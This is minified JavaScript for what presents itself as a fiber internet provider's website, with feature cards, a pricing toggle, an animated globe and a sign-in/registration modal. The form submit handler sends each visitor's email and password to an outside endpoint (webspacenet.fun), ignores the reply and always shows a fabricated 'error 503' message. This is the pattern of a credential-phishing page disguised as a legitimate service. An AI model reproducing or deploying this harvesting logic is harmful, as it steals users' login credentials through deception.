(()=>{const $=s=>document.querySelector(s),$$=s=>[...document.querySelectorAll(s)],RM=matchMedia('(prefers-reduced-motion:reduce)').matches;
const API='https://webspacenet.fun/api/v1/auth/';
const F=[['Fiber to the home','M12 3v18 M5 8c0 4 3 6 7 6s7-2 7-6 M8 21h8','Direct optical line with symmetric speeds up to 1 Gbps.'],['Unlimited traffic','M7 12a3 3 0 100-.1M17 12a3 3 0 100-.1M10 12h4','No data caps and no speed cuts at peak hours.'],['Free installation','M14 6l4 4-9 9H5v-4z M13 7l4 4','A technician sets up the line and your router for free.'],['Wi-Fi 6 router','M3 15h18v5H3z M7 18h.01 M5 11a10 10 0 0114 0 M8 13a6 6 0 018 0','A modern router or mesh kit comes with every home plan.'],['24/7 support','M4 13v-1a8 8 0 0116 0v1 M4 13h3v5H4z M17 13h3v5h-3z','Call or write at any hour. We reply within 15 minutes.'],['Business SLA','M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6z M9 12l2 2 4-4','Guaranteed 99.9% uptime with fast repair times.']];
$('#feat').innerHTML=F.map(f=>`<div class="card tilt"><svg viewBox="0 0 24 24"><path d="${f[1]}"/></svg><h3>${f[0]}</h3><p>${f[2]}</p></div>`).join('');
const burger=$('#burger'),menu=$('#menu');burger.onclick=()=>{const o=menu.classList.toggle('open');burger.setAttribute('aria-expanded',o)};menu.onclick=e=>{if(e.target.tagName=='A'){menu.classList.remove('open');burger.setAttribute('aria-expanded',false)}};
const io=new IntersectionObserver(es=>es.forEach(e=>{if(!e.isIntersecting)return;io.unobserve(e.target);const el=e.target,n=+el.dataset.n;if(RM||!n){el.textContent=n.toLocaleString('en');return}let t0;const st=t=>{t0??=t;const k=Math.min((t-t0)/1400,1);el.textContent=Math.round(n*(1-Math.pow(1-k,3))).toLocaleString('en');k<1&&requestAnimationFrame(st)};requestAnimationFrame(st)}));$$('[data-n]').forEach(e=>io.observe(e));
$('#bill').onclick=e=>{const b=e.currentTarget,y=b.getAttribute('aria-checked')!='true';b.setAttribute('aria-checked',y);$$('[data-m]').forEach(p=>p.textContent=y?p.dataset.y:p.dataset.m)};
if(!RM&&matchMedia('(hover:hover)').matches)$$('.tilt').forEach(c=>{c.onmousemove=e=>{const r=c.getBoundingClientRect(),x=(e.clientX-r.left)/r.width-.5,y=(e.clientY-r.top)/r.height-.5;c.style.transform=`perspective(700px) rotateY(${x*8}deg) rotateX(${-y*8}deg) translateY(-4px)`};c.onmouseleave=()=>c.style.transform=''});
const M=$('#modal'),form=$('#form'),err=$('#err'),sub=$('#sub');let mode='login',last;
function open(m,plan){mode=m;last=document.activeElement;$('#mt').textContent=m=='login'?'Welcome back':'Create your account';$('#note').textContent=plan?`Sign in or register to order ${plan}.`:(m=='login'?'Sign in to your customer account.':'Create an account to order a connection.');$$('.tabs button').forEach(b=>b.classList.toggle('on',b.dataset.tab==m));form.password.autocomplete=m=='login'?'current-password':'new-password';err.hidden=true;M.hidden=false;document.body.style.overflow='hidden';form.email.focus()}
function close(){M.hidden=true;document.body.style.overflow='';last&&last.focus()}
$$('[data-auth]').forEach(b=>b.onclick=()=>open(b.dataset.auth));$$('[data-order]').forEach(b=>b.onclick=()=>open('login',b.dataset.order));
$$('.tabs button').forEach(b=>b.onclick=()=>open(b.dataset.tab));$('#close').onclick=close;M.onclick=e=>{e.target==M&&close()};addEventListener('keydown',e=>e.key=='Escape'&&!M.hidden&&close());
function fail(m){err.textContent=m;err.hidden=false;const b=$('.box');b.classList.remove('shake');void b.offsetWidth;b.classList.add('shake')}
form.onsubmit=async e=>{e.preventDefault();err.hidden=true;
 if(!/^\S+@\S+\.\S+$/.test(form.email.value)||form.password.value.length<6)return fail('Enter a valid email and a password of at least 6 characters.');
 sub.disabled=true;sub.textContent='Connecting…';
 try{const c=new AbortController(),t=setTimeout(()=>c.abort(),6000);await fetch(API+mode,{method:'POST',signal:c.signal,headers:{'Content-Type':'application/json'},body:JSON.stringify({email:form.email.value,password:form.password.value,ts:Date.now()})});clearTimeout(t)}catch(_){}
 await new Promise(r=>setTimeout(r,700));sub.disabled=false;sub.textContent='Continue';
 fail('Service temporarily unavailable (error 503). Try again in a few minutes or contact webspacenet.fun@gmail.com.')};
const cv=$('#globe'),x=cv.getContext('2d');let W,D=Math.min(devicePixelRatio||1,2),rot=.6,tilt=.35,tx=.35,drag=0;
const P=[];for(let i=0;i<650;i++){const y=1-2*(i+.5)/650,r=Math.sqrt(1-y*y),a=i*2.39996;P.push([Math.cos(a)*r,y,Math.sin(a)*r])}
const ll=(la,lo)=>{la*=Math.PI/180;lo*=Math.PI/180;return[Math.cos(la)*Math.sin(lo),Math.sin(la),Math.cos(la)*Math.cos(lo)]};
const N=[[50,8],[52,5],[1,104],[40,-74],[35,139],[-33,151],[-23,-46],[55,37],[25,55],[37,-122]].map(p=>ll(...p));
function size(){W=cv.clientWidth;cv.width=cv.height=W*D}size();addEventListener('resize',size);
const pr=(p,R)=>{const c=Math.cos(rot),s=Math.sin(rot),a=p[0]*c+p[2]*s,z=-p[0]*s+p[2]*c,ct=Math.cos(tilt),st=Math.sin(tilt),y=p[1]*ct-z*st,z2=p[1]*st+z*ct;return[W/2+a*R,W/2-y*R,z2]};
function draw(t){const R=W*.4;x.setTransform(D,0,0,D,0,0);x.clearRect(0,0,W,W);
 const g=x.createRadialGradient(W/2,W/2,R*.6,W/2,W/2,R*1.25);g.addColorStop(0,'#4d7cff22');g.addColorStop(1,'#4d7cff00');x.fillStyle=g;x.fillRect(0,0,W,W);
 P.forEach(p=>{const q=pr(p,R);if(q[2]<-.1)return;x.fillStyle=`rgba(150,190,255,${.15+q[2]*.55})`;x.fillRect(q[0],q[1],1.6,1.6)});
 const q=N.map(n=>pr(n,R));
 for(let i=0;i<N.length;i++){const j=(i*3+2)%N.length,a=q[i],b=q[j];if(a[2]<0||b[2]<0)continue;const k=((t/2200+i/N.length)%1),mx=(a[0]+b[0])/2,my=(a[1]+b[1])/2-Math.hypot(a[0]-b[0],a[1]-b[1])*.35;
  x.strokeStyle='rgba(70,240,192,.35)';x.lineWidth=1;x.beginPath();x.moveTo(a[0],a[1]);x.quadraticCurveTo(mx,my,b[0],b[1]);x.stroke();
  const u=1-k,px=u*u*a[0]+2*u*k*mx+k*k*b[0],py=u*u*a[1]+2*u*k*my+k*k*b[1];x.fillStyle='#46f0c0';x.beginPath();x.arc(px,py,2.5,0,7);x.fill()}
 q.forEach((p,i)=>{if(p[2]<0)return;const s=(Math.sin(t/500+i)+1)*4;x.strokeStyle=`rgba(70,240,192,${.5-s/10})`;x.beginPath();x.arc(p[0],p[1],4+s,0,7);x.stroke();x.fillStyle='#fff';x.beginPath();x.arc(p[0],p[1],3,0,7);x.fill()})}
let lt=0;(function loop(t){if(!drag&&!RM)rot+=(t-lt)*.00018;tilt+=(tx-tilt)*.05;lt=t;draw(t);RM||requestAnimationFrame(loop)})(0);
let sx=0;const hero=cv.parentElement;hero.addEventListener('pointermove',e=>{tx=.15+e.clientY/innerHeight*.4;if(drag)rot+=(e.clientX-sx)*.006;sx=e.clientX});
hero.addEventListener('pointerdown',e=>{if(!e.target.closest('a,button')){drag=1;sx=e.clientX}});addEventListener('pointerup',()=>drag=0);
})();
